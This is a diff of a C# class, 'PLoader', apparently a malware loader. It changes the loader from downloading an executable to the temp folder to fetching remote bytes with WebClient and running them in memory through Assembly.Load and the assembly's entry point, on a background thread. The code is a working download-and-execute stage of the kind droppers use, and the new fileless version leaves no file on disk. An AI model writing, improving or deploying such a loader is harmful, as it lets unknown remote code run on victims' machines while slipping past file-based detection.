@@ -1,42 +1,30 @@
-﻿using System;
-using System.IO;
+using System;
 using System.Net;
 using System.Reflection;
+using System.Threading;
 
 namespace Loader
 {
     internal static class PLoader
     {
-        
         #region Variables
-        private static readonly string temp = Path.GetTempPath(), tempPX = $@"{temp}\94016.px";
+        private static readonly WebClient client = new();
         #endregion
 
         /// <summary>
-        /// Launch a exe file dynamically.
-        /// <para>First download it from the [host] url, place it in %tmp%, use it's [init] function from the class which is specified via [eClass].</para>
+        /// Run a EXE File from a URL, then call it's entry point function.
         /// </summary>
-        /// <param name="host"></param>
-        /// <param name="eClass"></param>
-        public static void exec(string host, string eClass)
-        {
-            var client = new WebClient();
-            try
+        /// <param name="host">The URL</param>
+        public static void mem_st_call(string host) =>
+            new Thread(() =>
             {
-                if (File.Exists(tempPX)) File.Delete(tempPX);
-                System.Threading.Thread.Sleep(150);
-                client.DownloadFile(host, tempPX);
-                var stream = new FileStream(tempPX, FileMode.Open);
-                var br = new BinaryReader(stream);
-                var bin = br.ReadBytes((int) stream.Length);
-                var asm = Assembly.Load(bin);
-                dynamic o = asm.CreateInstance(eClass);
-                o?.init();
-                stream.Close();
-                br.Close();
-                File.Delete(tempPX);
-            }
-            catch (Exception ex) {Console.WriteLine($"Error: {ex}");}
-        }
+                try
+                {
+                    var asm = Assembly.Load(client.DownloadData(host));
+                    asm.EntryPoint.Invoke(null, null);
+                    client.Dispose();
+                }
+                catch (Exception ex) { Console.WriteLine($"Error: {ex}"); }
+            }).Start();
     }
 }
